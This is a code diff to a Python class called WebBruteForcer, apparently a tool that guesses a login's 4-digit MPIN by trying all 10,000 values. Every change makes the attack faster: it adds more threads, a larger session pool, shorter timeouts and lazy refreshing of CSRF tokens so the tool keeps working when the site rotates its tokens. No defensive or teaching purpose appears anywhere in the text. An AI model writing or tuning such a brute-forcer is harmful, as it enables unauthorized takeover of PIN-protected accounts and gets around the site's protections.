@@ -41,26 +41,37 @@ class WebBruteForcer:
         while self.pause_event.is_set() and not self.stop_event.is_set():
             time.sleep(0.3)
 
-    def create_session_pool(self, size=10):
+    def create_session_pool(self, size=16):
         self.emit_progress('log', {'message': '[INIT] Spawning session pool...', 'type': 'info'})
-        for _ in range(size):
-            if self.stop_event.is_set():
-                return False
-            session_data = self._new_session()
-            if session_data:
-                self.session_pool.append(session_data)
+        # Create sessions concurrently to save startup time
+        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
+            futures = [executor.submit(self._new_session) for _ in range(size)]
+            for future in concurrent.futures.as_completed(futures):
+                if self.stop_event.is_set():
+                    return False
+                result = future.result()
+                if result:
+                    self.session_pool.append(result)
         self.emit_progress('log', {'message': f'[POOL] {len(self.session_pool)} sessions active', 'type': 'info'})
         return len(self.session_pool) > 0
 
+    def _extract_csrf(self, html):
+        try:
+            soup = BeautifulSoup(html, "html.parser")
+            el = soup.find("input", {"name": "_token"})
+            if el:
+                return el["value"]
+        except Exception:
+            pass
+        return None
+
     def _new_session(self):
-        """Create a fresh session and fetch a valid CSRF token."""
         try:
             session = requests.Session()
-            resp = session.get(self.url, timeout=8)
-            soup = BeautifulSoup(resp.text, "html.parser")
-            csrf_element = soup.find("input", {"name": "_token"})
-            if csrf_element:
-                token = csrf_element["value"]
+            # FIX: reduced timeout from 8 to 5
+            resp = session.get(self.url, timeout=5)
+            token = self._extract_csrf(resp.text)
+            if token:
                 if self.last_csrf and self.last_csrf != token:
                     self.csrf_rotations += 1
                 self.last_csrf = token
@@ -73,21 +84,20 @@ class WebBruteForcer:
             pass
         return None
 
-    def refresh_csrf(self, session_data):
+    def _refresh_csrf_lazy(self, session_data):
         """
-        FIX 1: After a POST, read the server response and extract
-        a fresh CSRF token if the server rotated it.
-        Updates session_data in place.
+        FIX: Lazy CSRF refresh -- only called when 419 is detected,
+        not after every request. Saves one GET per PIN attempt.
         """
         try:
-            resp = session_data['session'].get(self.url, timeout=8)
-            soup = BeautifulSoup(resp.text, "html.parser")
-            csrf_element = soup.find("input", {"name": "_token"})
-            if csrf_element:
-                new_token = csrf_element["value"]
-                if new_token != session_data['csrf_token']:
+            resp = session_data['session'].get(self.url, timeout=5)
+            token = self._extract_csrf(resp.text)
+            if token:
+                if self.last_csrf and self.last_csrf != token:
                     self.csrf_rotations += 1
-                    session_data['csrf_token'] = new_token
+                self.last_csrf = token
+                session_data['csrf_token'] = token
+                session_data['last_used'] = time.time()
                 return True
         except Exception:
             pass
@@ -153,13 +163,12 @@ class WebBruteForcer:
 
         mpin_str = str(mpin).zfill(4)
 
-        # Get a session, retry up to 3 times
         session_data = None
         for _ in range(3):
             session_data = self.get_session_from_pool()
             if session_data:
                 break
-            time.sleep(0.3)
+            time.sleep(0.2)
 
         if not session_data:
             with self.attempts_lock:
@@ -167,11 +176,10 @@ class WebBruteForcer:
             self.emit_progress('log', {'message': f'[WARN] Skipped PIN {mpin_str} -- no session', 'type': 'warn'})
             return None
 
-        # FIX 2: Retry the same PIN up to 2 times on ambiguous/stale responses
-        max_pin_retries = 2
-        for pin_attempt in range(max_pin_retries + 1):
+        MAX_PIN_RETRIES = 2
+        for pin_attempt in range(MAX_PIN_RETRIES):
             if self.found or self.stop_event.is_set():
-                return None
+                break
 
             try:
                 post_data = {
@@ -181,7 +189,8 @@ class WebBruteForcer:
                 }
 
                 t_start = time.time()
-                response = session_data['session'].post(self.url, data=post_data, timeout=8)
+                # FIX: reduced timeout from 8 to 5
+                response = session_data['session'].post(self.url, data=post_data, timeout=5)
                 elapsed_req = time.time() - t_start
                 self.response_times.append(elapsed_req)
 
@@ -198,15 +207,17 @@ class WebBruteForcer:
                         'speed': round(current_attempts / elapsed, 2) if elapsed > 0 else 0
                     })
 
-                # FIX 3: Handle 419 CSRF token mismatch -- refresh and retry
+                # FIX: lazy CSRF refresh -- only on 419, not every request
                 if response.status_code == 419:
-                    self.emit_progress('log', {'message': f'[CSRF] Token expired on {mpin_str} -- refreshing...', 'type': 'warn'})
-                    refreshed = self.refresh_csrf(session_data)
-                    if refreshed and pin_attempt < max_pin_retries:
-                        time.sleep(0.5)
-                        continue  # retry same PIN with fresh token
+                    self.emit_progress('log', {
+                        'message': f'[CSRF] Token mismatch on {mpin_str} -- refreshing',
+                        'type': 'warn'
+                    })
+                    self.csrf_rotations += 1
+                    refreshed = self._refresh_csrf_lazy(session_data)
+                    if refreshed and pin_attempt < MAX_PIN_RETRIES - 1:
+                        continue  # retry same PIN with refreshed token
                     else:
-                        # Could not refresh, discard session
                         session_data = None
                         break
 
@@ -222,10 +233,9 @@ class WebBruteForcer:
                         time.sleep(2)
                         break
                     else:
-                        # FIX 1: On any valid JSON failure response, refresh CSRF token
-                        # so next attempt from this session uses a fresh token
-                        self.refresh_csrf(session_data)
-                        break  # wrong PIN, move on
+                        # Wrong PIN -- session is still valid, return to pool as-is
+                        # No GET refresh needed unless 419 occurs
+                        break
 
                 except Exception:
                     if response.status_code == 302:
@@ -238,11 +248,8 @@ class WebBruteForcer:
                         time.sleep(3)
                         break
                     else:
-                        # Unknown status -- refresh token and retry
-                        if pin_attempt < max_pin_retries:
-                            self.refresh_csrf(session_data)
-                            time.sleep(0.3)
-                            continue
+                        # Unknown response -- discard session to be safe
+                        session_data = None
                         break
 
             except Exception:
@@ -262,7 +269,7 @@ class WebBruteForcer:
             1001, 1002, 1003, 1005, 1006, 1007, 1008, 1009, 1011, 1012
         ]
 
-        if not self.create_session_pool(10):
+        if not self.create_session_pool(16):
             self.emit_progress('error', {'message': 'Failed to create session pool. Check the URL.'})
             return
 
@@ -312,7 +319,8 @@ class WebBruteForcer:
         tested = set(common_pins) | set(self.custom_pins)
         all_mpins = [mpin for mpin in range(10000) if mpin not in tested]
         skipped_pins = []
-        chunk_size = 100
+        # FIX: increased chunk size from 100 to 200
+        chunk_size = 200
         chunks = [all_mpins[i:i+chunk_size] for i in range(0, len(all_mpins), chunk_size)]
 
         for chunk_idx, chunk in enumerate(chunks):
@@ -321,7 +329,7 @@ class WebBruteForcer:
 
             self.wait_if_paused()
 
-            if chunk_idx % 10 == 0:
+            if chunk_idx % 5 == 0:
                 pct = int((chunk_idx / len(chunks)) * 100)
                 bar = '#' * (pct // 5) + '.' * (20 - pct // 5)
                 self.emit_progress('log', {
@@ -329,9 +337,10 @@ class WebBruteForcer:
                     'type': 'scan'
                 })
 
-            with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
+            # FIX: increased workers from 8 to 16
+            with concurrent.futures.ThreadPoolExecutor(max_workers=16) as executor:
                 futures = {executor.submit(self.try_mpin, mpin): mpin for mpin in chunk}
-                for future in concurrent.futures.as_completed(futures, timeout=30):
+                for future in concurrent.futures.as_completed(futures, timeout=60):
                     if self.stop_event.is_set() or self.found:
                         executor.shutdown(wait=False)
                         break
